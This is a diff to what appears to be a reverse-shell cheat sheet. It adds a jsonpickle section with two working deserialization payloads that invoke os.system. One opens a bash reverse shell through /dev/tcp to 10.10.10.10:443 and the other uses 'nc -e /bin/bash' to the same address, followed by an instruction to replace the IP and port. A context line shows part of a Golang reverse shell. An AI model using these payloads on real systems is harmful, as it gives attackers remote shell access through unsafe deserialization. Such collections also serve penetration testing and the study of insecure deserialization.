@@ -22,6 +22,7 @@ Basic reverse shells for any scenario
 - NodeJS
 - TCLsh
 - Golang
+- jsonpickle 
 
 
 # Python
@@ -494,6 +495,17 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 
 // Replace IP & Port
 
+```
+
+# jsonpickle 
+```
+{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'"], 0, 0, 0]}
+
+If netcat is installed
+
+{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/bash 10.10.10.10 443"], 0, 0, 0]}
+
+// Replace IP & Port
 ```
 
 
